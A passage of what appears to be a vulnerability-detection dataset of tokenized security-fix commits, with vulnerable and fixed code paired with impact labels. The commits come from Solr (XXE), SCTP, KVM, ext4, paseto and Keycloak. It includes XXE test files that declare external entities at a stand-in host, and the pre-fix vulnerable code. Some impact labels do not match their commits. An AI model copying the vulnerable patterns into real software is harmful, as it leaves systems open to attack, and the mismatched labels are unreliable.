"warnings", "to", "a", "custom", "logger", ".", "*", "/", "protected", "ErrorHandler", "getErrorHandler", "(", ")", "{", "return", "null", ";", "}", "private", "Document", "parseXML", "(", "InputStream", "pXmlFile", ")", "throws", "ParserException", "{", "final", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "dbf", ".", "setValidating", "(", "false", ")", ";", "dbf", ".", "setFeature", "(", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "/", "/", "ignore", "since", "all", "implementations", "are", "required", "to", "support", "the", "/", "/", "{", "@", "link", "javax", ".", "xml", ".", "XMLConstants", "#", "FEATURE_SECURE_PROCESSING", "}", "feature", "final", "DocumentBuilder", "db", ";", "db", "=", "dbf", ".", "newDocumentBuilder", "(", ");", "}", "catch", "(", "Exception", "se", ")", "{", "throw", "new", "ParserException", "(", "\"", "XML", "Parser", "configuration", "error", ".", "\",", "se", ")", ";", "try", "{", "db", ".", "setEntityResolver", "(", "getEntityResolver", "(", "))", ";", "db", ".", "setErrorHandler", "(", "getErrorHandler", "(", "))", ";", "return", "db", ".", "parse", "(", "pXmlFile", ")", ";", "}", "catch", "(", "Exception", "se", ")", "{", "throw", "new", "ParserException", "(", "\"", "Error", "parsing", "XML", "stream", ":", "\"", "+", "se", ",", "se", ")", ";", "public", "static", "final", "EntityResolver", "DISALLOW_EXTERNAL_ENTITY_RESOLVER", "=", "(", "String", "publicId", ",", "String", "systemId", ")", "-", ">", "{", "throw", "new", "SAXException", "(", "String", ".", "format", "(", "Locale", ".", "ENGLISH", ",", "\"", "External", "Entity", "resolving", "unsupported", ":", "publicId", "=", "\\\"", "%", "s", "\\", "\"", "systemId", "=", "\\\"", "%", "s", "\\", "\"\"", ",", "publicId", ",", "systemId", ")", ");", "}", ";", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!", "DOCTYPE", "TermQuery", "SYSTEM", "\"", "foo", ":", "//", "bar", ".", "xyz", "/", "mydtd", "\"", ">", "<", "!-", "-", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "the", "License", ".", "-", "->", "<", "TermQuery", "fieldName", "=", "\"", "contents", "\"", ">", "sumitomo", "<", "/", "TermQuery", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "23", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!", "DOCTYPE", "TermQuery", "[", "<", "!", "ENTITY", "internalTerm", "\"", "sumitomo", "\"", ">", "<", "!", "ENTITY", "externalTerm", "SYSTEM", "\"", "foo", ":", "//", "bar", ".", "xyz", "/", "external", "\"", ">", "<", "!", "ENTITY", "%", "myParameterEntity", "\"", "foo", ":", "//", "bar", ".", "xyz", "/", "param", "\"", ">", "]", ">", "<", "!-", "-", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "the", "License", ".", "-", "->", "<", "TermQuery", "fieldName", "=", "\"", "contents", "\"", ">&", "internalTerm", ";", "&", "externalTerm", ";", "</", "TermQuery", ">", "@", "@", "-", "30", ",", "6", "+", "30", ",", "7", "@", "@", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "public", "void", "test_DOCTYPE_TermQueryXML", "(", ")", "throws", "ParserException", ",", "IOException", "{", "SAXException", "saxe", "=", "LuceneTestCase", ".", "expectThrows", "(", "ParserException", ".", "class", ",", "SAXException", ".", "class", ",", "(", ")", "-", ">", "parse", "(", "\"", "DOCTYPE_TermQuery", ".", "xml", "\"", "))", ";", "assertTrue", "(", "saxe", ".", "getMessage", "(", ").", "startsWith", "(", "\"", "External", "Entity", "resolving", "unsupported", ":", "\")", ");", "}", "public", "void", "test_ENTITY_TermQueryXML", "(", ")", "throws", "ParserException", ",", "IOException", "{", "SAXException", "saxe", "=", "LuceneTestCase", ".", "expectThrows", "(", "ParserException", ".", "class", ",", "SAXException", ".", "class", ",", "(", ")", "-", ">", "parse", "(", "\"", "ENTITY_TermQuery", ".", "xml", "\"", "))", ";", "assertTrue", "(", "saxe", ".", "getMessage", "(", ").", "startsWith", "(", "\"", "External", "Entity", "resolving", "unsupported", ":", "\")", ");", "}", "Upgrade", "Notes", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "SOLR", "-", "11477", ":", "in", "the", "XML", "query", "parser", "(", "defType", "=", "xmlparser", "or", "{", "!", "xmlparser", ".", "..", "}", ")", "the", "resolving", "of", "external", "entities", "is", "now", "disallowed", "by", "default", ".", "Bug", "Fixes", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "SOLR", "-", "11477", ":", "Disallow", "resolving", "of", "external", "entities", "in", "the", "XML", "query", "parser", "(", "defType", "=", "xmlparser", ")", ".", "(", "Michael", "Stepankin", ",", "Olga", "Barinova", ",", "Uwe", "Schindler", ",", "Christine", "Poerschke", ")", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "util", ".", "XMLErrorLogger", ";", "import", "org", ".", "xml", ".", "sax", ".", "ErrorHandler", ";", "private", "static", "final", "XMLErrorLogger", "xmllog", "=", "new", "XMLErrorLogger", "(", "log", ")", ";", "@", "Override", "protected", "ErrorHandler", "getErrorHandler", "(", ")", "{", "return", "xmllog", ";", "}</s>(", "No", "Changes", ")", "static", "Document", "parseXML", "(", "InputStream", "pXmlFile", ")", "throws", "ParserException", "{", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilder", "db", "=", "null", ";", "db", "=", "dbf", ".", "newDocumentBuilder", "(", ");", "}", "catch", "(", "Exception", "se", ")", "{", "throw", "new", "ParserException", "(", "\"", "XML", "Parser", "configuration", "error", "\"", ",", "se", ")", ";", "org", ".", "w3c", ".", "dom", ".", "Document", "doc", "=", "null", ";", "doc", "=", "db", ".", "parse", "(", "pXmlFile", ")", ";", "catch", "(", "Exception", "se", ")", "{", "throw", "new", "ParserException", "(", "\"", "Error", "parsing", "XML", "stream", ":", "\"", "+", "se", ",", "se", ")", ";", "return", "doc", ";", "(", "No", "Changes", ")"], "docstring_tokens": ["execute", "any", "shell", "command", "on", "the", "server", "where", "Solr", "is", "running", "."]}
{"contents": ["ext4:", "consolidate", "in_range()", "definitions", "There", "are", "duplicate", "macro", "definitions", "of", "in_range()", "in", "mballoc.h", "and", "balloc.c.", "This", "consolidates", "these", "two", "definitions", "into", "ext4.h,", "and", "changes", "extents.c", "to", "use", "in_range()", "as", "well.", "Signed-off-by:", "Akinobu", "Mita", "<akinobu.mita@gmail.com>", "Signed-off-by:", "\"Theodore", "Ts'o\"", "<tytso@mit.edu>", "Cc:", "Andreas", "Dilger", "<adilger@sun.com>"], "code_tokens": ["#", "define", "in_range", "(", "b", ",", "first", ",", "len", ")", "(", "(", "b", ")", ">", "=", "(", "first", ")", "&", "&", "(", "b", ")", "<", "=", "(", "first", ")", "+", "(", "len", ")", "-", "1", ")", "if", "(", "in_range", "(", "block", ",", "cex", "-", ">", "ec_block", ",", "cex", "-", ">", "ec_len", ")", ")", "{", "if", "(", "in_range", "(", "iblock", ",", "ee_block", ",", "ee_len", ")", ")", "{</s>#", "define", "in_range", "(", "b", ",", "first", ",", "len", ")", "(", "(", "b", ")", ">", "=", "(", "first", ")", "&", "&", "(", "b", ")", "<", "=", "(", "first", ")", "+", "(", "len", ")", "-", "1", ")", "if", "(", "block", ">", "=", "cex", "-", ">", "ec_block", "&", "&", "block", "<", "cex", "-", ">", "ec_block", "+", "cex", "-", ">", "ec_len", ")", "{", "if", "(", "iblock", ">", "=", "ee_block", "&", "&", "iblock", "<", "ee_block", "+", "ee_len", ")", "{", "#", "define", "in_range", "(", "b", ",", "first", ",", "len", ")", "(", "(", "b", ")", ">", "=", "(", "first", ")", "&", "&", "(", "b", ")", "<", "=", "(", "first", ")", "+", "(", "len", ")", "-", "1", ")"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(BUG", "and", "system", "crash", ")"]}
{"contents": ["net:", "sctp:", "fix", "NULL", "pointer", "dereference", "in", "af->from_addr_param", "on", "malformed", "packet", "An", "SCTP", "server", "doing", "ASCONF", "will", "panic", "on", "malformed", "INIT", "ping-of-death", "in", "the", "form", "of:", "------------", "INIT[PARAM:", "SET_PRIMARY_IP]", "------------>", "While", "the", "INIT", "chunk", "parameter", "verification", "dissects", "through", "many", "things", "in", "order", "to", "detect", "malformed", "input,", "it", "misses", "to", "actually", "check", "parameters", "inside", "of", "parameters.", "E.g.", "RFC5061,", "section", "4.2.4", "proposes", "a", "'set", "primary", "IP", "address'", "parameter", "in", "ASCONF,", "which", "has", "as", "a", "subparameter", "an", "address", "parameter.", "So", "an", "attacker", "may", "send", "a", "parameter", "type", "other", "than", "SCTP_PARAM_IPV4_ADDRESS", "or", "SCTP_PARAM_IPV6_ADDRESS,", "param_type2af()", "will", "subsequently", "return", "0", "and", "thus", "sctp_get_af_specific()", "returns", "NULL,", "too,", "which", "we", "then", "happily", "dereference", "unconditionally", "through", "af->from_addr_param().", "The", "trace", "for", "the", "log:", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "0000000000000078", "IP:", "[<ffffffffa01e9c62>]", "sctp_process_init+0x492/0x990", "[sctp]", "PGD", "0", "Oops:", "0000", "[#1]", "SMP", "[...]", "Pid:", "0,", "comm:", "swapper", "Not", "tainted", "2.6.32-504.el6.x86_64", "#1", "Bochs", "Bochs", "RIP:", "0010:[<ffffffffa01e9c62>]", "[<ffffffffa01e9c62>]", "sctp_process_init+0x492/0x990", "[sctp]", "[...]", "Call", "Trace:", "<IRQ>", "[<ffffffffa01f2add>]", "?", "sctp_bind_addr_copy+0x5d/0xe0", "[sctp]", "[<ffffffffa01e1fcb>]", "sctp_sf_do_5_1B_init+0x21b/0x340", "[sctp]", "[<ffffffffa01e3751>]", "sctp_do_sm+0x71/0x1210", "[sctp]", "[<ffffffffa01e5c09>]", "?", "sctp_endpoint_lookup_assoc+0xc9/0xf0", "[sctp]", "[<ffffffffa01e61f6>]", "sctp_endpoint_bh_rcv+0x116/0x230", "[sctp]", "[<ffffffffa01ee986>]", "sctp_inq_push+0x56/0x80", "[sctp]", "[<ffffffffa01fcc42>]", "sctp_rcv+0x982/0xa10", "[sctp]", "[<ffffffffa01d5123>]", "?", "ipt_local_in_hook+0x23/0x28", "[iptable_filter]", "[<ffffffff8148bdc9>]", "?", "nf_iterate+0x69/0xb0", "[<ffffffff81496d10>]", "?", "ip_local_deliver_finish+0x0/0x2d0", "[<ffffffff8148bf86>]", "?", "nf_hook_slow+0x76/0x120", "[<ffffffff81496d10>]", "?", "ip_local_deliver_finish+0x0/0x2d0", "[...]", "A", "minimal", "way", "to", "address", "this", "is", "to", "check", "for", "NULL", "as", "we", "do", "on", "all", "other", "such", "occasions", "where", "we", "know", "sctp_get_af_specific()", "could", "possibly", "return", "with", "NULL.", "Fixes:", "d6de3097592b", "(\"[SCTP]:", "Add", "the", "handling", "of", "\"Set", "Primary", "IP", "Address\"", "parameter", "to", "INIT\")", "Signed-off-by:", "Daniel", "Borkmann", "<dborkman@redhat.com>", "Cc:", "Vlad", "Yasevich", "<vyasevich@gmail.com>", "Acked-by:", "Neil", "Horman", "<nhorman@tuxdriver.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["if", "(", "af", "=", "=", "NULL", ")", "break", ";</s>"], "docstring_tokens": ["the", "system", "to", "crash"]}
{"contents": ["KVM:", "x86:", "Convert", "MSR_KVM_SYSTEM_TIME", "to", "use", "gfn_to_hva_cache", "functions", "(", ")", "There", "is", "a", "potential", "use", "after", "free", "issue", "with", "the", "handling", "of", "MSR_KVM_SYSTEM_TIME.", "If", "the", "guest", "specifies", "a", "GPA", "in", "a", "movable", "or", "removable", "memory", "such", "as", "frame", "buffers", "then", "KVM", "might", "continue", "to", "write", "to", "that", "address", "even", "after", "it's", "removed", "via", "KVM_SET_USER_MEMORY_REGION.", "KVM", "pins", "the", "page", "in", "memory", "so", "it's", "unlikely", "to", "cause", "an", "issue,", "but", "if", "the", "user", "space", "component", "re-purposes", "the", "memory", "previously", "used", "for", "the", "guest,", "then", "the", "guest", "will", "be", "able", "to", "corrupt", "that", "memory.", "Tested:", "Tested", "against", "kvmclock", "unit", "test", "Signed-off-by:", "Andrew", "Honig", "<ahonig@google.com>", "Signed-off-by:", "Marcelo", "Tosatti", "<mtosatti@redhat.com>"], "code_tokens": ["struct", "gfn_to_hva_cache", "pv_time", ";", "bool", "pv_time_enabled", ";", "struct", "pvclock_vcpu_time_info", "guest_hv_clock", ";", "if", "(", "!", "vcpu", "-", ">", "pv_time_enabled", ")", "if", "(", "unlikely", "(", "kvm_read_guest_cached", "(", "v", "-", ">", "kvm", ",", "&", "vcpu", "-", ">", "pv_time", ",", "&", "guest_hv_clock", ",", "sizeof", "(", "guest_hv_clock", ")", "))", ")", "return", "0", ";", "pvclock_flags", "=", "(", "guest_hv_clock", ".", "flags", "&", "PVCLOCK_GUEST_STOPPED", ")", ";", "kvm_write_guest_cached", "(", "v", "-", ">", "kvm", ",", "&", "vcpu", "-", ">", "pv_time", ",", "&", "vcpu", "-", ">", "hv_clock", ",", "sizeof", "(", "vcpu", "-", ">", "hv_clock", ")", ");", "vcpu", "-", ">", "arch", ".", "pv_time_enabled", "=", "false", ";", "u64", "gpa_offset", ";", "gpa_offset", "=", "data", "&", "~", "(", "PAGE_MASK", "|", "1", ")", ";", "if", "(", "gpa_offset", "&", "(", "sizeof", "(", "struct", "pvclock_vcpu_time_info", ")", "-", "1", ")", ")", "if", "(", "kvm_gfn_to_hva_cache_init", "(", "vcpu", "-", ">", "kvm", ",", "&", "vcpu", "-", ">", "arch", ".", "pv_time", ",", "data", "&", "~", "1ULL", ")", ")", "vcpu", "-", ">", "arch", ".", "pv_time_enabled", "=", "false", ";", "else", "vcpu", "-", ">", "arch", ".", "pv_time_enabled", "=", "true", ";", "if", "(", "!", "vcpu", "-", ">", "arch", ".", "pv_time_enabled", ")", "vcpu", "-", ">", "arch", ".", "pv_time_enabled", "=", "false", ";</s>unsigned", "int", "time_offset", ";", "struct", "page", "*", "time_page", ";", "void", "*", "shared_kaddr", ";", "struct", "pvclock_vcpu_time_info", "*", "guest_hv_clock", ";", "if", "(", "!", "vcpu", "-", ">", "time_page", ")", "shared_kaddr", "=", "kmap_atomic", "(", "vcpu", "-", ">", "time_page", ")", ";", "guest_hv_clock", "=", "shared_kaddr", "+", "vcpu", "-", ">", "time_offset", ";", "pvclock_flags", "=", "(", "guest_hv_clock", "-", ">", "flags", "&", "PVCLOCK_GUEST_STOPPED", ")", ";", "memcpy", "(", "shared_kaddr", "+", "vcpu", "-", ">", "time_offset", ",", "&", "vcpu", "-", ">", "hv_clock", ",", "sizeof", "(", "vcpu", "-", ">", "hv_clock", ")", ");", "kunmap_atomic", "(", "shared_kaddr", ")", ";", "mark_page_dirty", "(", "v", "-", ">", "kvm", ",", "vcpu", "-", ">", "time", ">", ">", "PAGE_SHIFT", ")", ";", "if", "(", "vcpu", "-", ">", "arch", ".", "time_page", ")", "{", "kvm_release_page_dirty", "(", "vcpu", "-", ">", "arch", ".", "time_page", ")", ";", "vcpu", "-", ">", "arch", ".", "time_page", "=", "NULL", ";", "}", "/", "*", ".", "..", "but", "clean", "it", "before", "doing", "the", "actual", "write", "*", "/", "vcpu", "-", ">", "arch", ".", "time_offset", "=", "data", "&", "~", "(", "PAGE_MASK", "|", "1", ")", ";", "if", "(", "vcpu", "-", ">", "arch", ".", "time_offset", "&", "(", "sizeof", "(", "struct", "pvclock_vcpu_time_info", ")", "-", "1", ")", ")", "vcpu", "-", ">", "arch", ".", "time_page", "=", "gfn_to_page", "(", "vcpu", "-", ">", "kvm", ",", "data", ">", ">", "PAGE_SHIFT", ")", ";", "if", "(", "is_error_page", "(", "vcpu", "-", ">", "arch", ".", "time_page", ")", ")", "vcpu", "-", ">", "arch", ".", "time_page", "=", "NULL", ";", "if", "(", "!", "vcpu", "-", ">", "arch", ".", "time_page", ")"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["Make", "V2LocalCryptoProvider", "argument", "order", "consistent", "with", "other", "methods"], "code_tokens": [".", "idea", "*", ".", "iml", "@", "@", "-", "32", ",", "7", "+", "32", ",", "7", "@", "@", "public", "byte", "[", "]", "blake2b", "(", "byte", "[", "]", "payload", ",", "byte", "[", "]", "random", ")", "{", "/", "*", "*", "Copyright", "2019", "-", "Present", "paseto", ".", "dev", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "dev", ".", "paseto", ".", "jpaseto", ".", "crypto", ".", "sodium", "import", "org", ".", "apache", ".", "commons", ".", "codec", ".", "binary", ".", "Hex", "import", "org", ".", "testng", ".", "annotations", ".", "Test", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", ".", "assertThat", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "is", "class", "Blake2bTest", "{", "@", "Test", "void", "blake2bTest", "(", ")", "{", "/", "/", "from", "https", ":", "//", "github", ".", "com", "/", "BLAKE2", "/", "BLAKE2", "/", "blob", "/", "master", "/", "testvectors", "/", "blake2b", "-", "kat", ".", "txt", "def", "payload", "=", "decode", "(", "\"", "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20", "\"", ")", "def", "key", "=", "decode", "(", "\"", "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f", "\"", ")", "def", "expectedHash", "=", "decode", "(", "\"", "5595e05c13a7ec4dc8f41fb70cb50a71bce17c024ff6de7af618d0cc4e9c32d9570d6d3ea45b86525491030c0d8f2b1836d5778c1ce735c17707df364d054347", "\"", ")", "def", "result", "=", "Blake2b", ".", "hash", "(", "expectedHash", ".", "length", ",", "payload", ",", "key", ")", "assertThat", "result", ",", "is", "(", "expectedHash", ")", "}", "private", "static", "byte", "[", "]", "decode", "(", "String", "input", ")", "{", "return", "Hex", ".", "decodeHex", "(", "input", ")", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "41", "@", "@", "/", "*", "*", "Copyright", "2019", "-", "Present", "paseto", ".", "dev", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "dev", ".", "paseto", ".", "jpaseto", ".", "crypto", ".", "sodium", "import", "org", ".", "apache", ".", "commons", ".", "codec", ".", "binary", ".", "Hex", "import", "org", ".", "hamcrest", ".", "MatcherAssert", "import", "org", ".", "testng", ".", "annotations", ".", "Test", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", ".", "assertThat", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "is", "class", "SodiumV2LocalCryptoProviderTest", "{", "@", "Test", "void", "blake2bTest", "(", ")", "{", "/", "/", "test", "vector", "with", "a", "24", "hash", "length", "def", "payload", "=", "decode", "(", "\"", "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20", "\"", ")", "def", "key", "=", "decode", "(", "\"", "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f", "\"", ")", "def", "expectedHash", "=", "decode", "(", "\"", "46cbab86d3dd2e34f925259a0cf69cc92cf48f094cecd403", "\"", ")", "def", "result", "=", "new", "SodiumV2LocalCryptoProvider", "(", ").", "blake2b", "(", "payload", ",", "key", ")", "assertThat", "result", ",", "is", "(", "expectedHash", ")", "}", "private", "static", "byte", "[", "]", "decode", "(", "String", "input", ")", "{", "return", "Hex", ".", "decodeHex", "(", "input", ")", "}", "}", "@", "@", "-", "19", ",", "7", "+", "19", ",", "7", "@", "@", "byte", "[", "]", "blake2b", "(", "byte", "[", "]", "payload", ",", "byte", "[", "]", "random", ")", ";</s>public", "byte", "[", "]", "blake2b", "(", "byte", "[", "]", "random", ",", "byte", "[", "]", "payload", ")", "{", "byte", "[", "]", "blake2b", "(", "byte", "[", "]", "random", ",", "byte", "[", "]", "payload", ")", ";"], "docstring_tokens": ["launch", "further", "attacks", "on", "the", "system"]}
{"contents": ["KEYCLOAK-12190", "Add", "validation", "for", "client", "root", "and", "base", "URLs"], "code_tokens": ["String", "INVALID_INPUT", "=", "\"", "invalid_input", "\"", ";", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationContext", ";", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationProvider", ";", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationUtil", ";", "ClientValidationUtil", ".", "validate", "(", "session", ",", "app", ",", "false", ",", "c", "-", ">", "{", "throw", "new", "RuntimeException", "(", "\"", "Invalid", "client", "\"", "+", "app", ".", "getClientId", "(", ")", "+", "\"", ":", "\"", "+", "c", ".", "getError", "(", "))", ";", "}", ");", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "models", ".", "ClientModel", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "public", "interface", "ClientValidationContext", "{", "enum", "Event", "{", "CREATE", ",", "UPDATE", "}", "Event", "getEvent", "(", ");", "KeycloakSession", "getSession", "(", ");", "ClientModel", "getClient", "(", ");", "String", "getError", "(", ");", "ClientValidationContext", "invalid", "(", "String", "error", ")", ";", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "29", "@", "@", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "provider", ".", "Provider", ";", "public", "interface", "ClientValidationProvider", "extends", "Provider", "{", "void", "validate", "(", "ClientValidationContext", "context", ")", ";", "@", "Override", "default", "void", "close", "(", ")", "{", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "37", "@", "@", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "Config", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSessionFactory", ";", "import", "org", ".", "keycloak", ".", "provider", ".", "ProviderFactory", ";", "public", "interface", "ClientValidationProviderFactory", "extends", "ProviderFactory", "<", "ClientValidationProvider", ">", "{", "@", "Override", "default", "void", "init", "(", "Config", ".", "Scope", "config", ")", "{", "}", "@", "Override", "default", "void", "postInit", "(", "KeycloakSessionFactory", "factory", ")", "{", "}", "@", "Override", "default", "void", "close", "(", ")", "{", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "45", "@", "@", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", 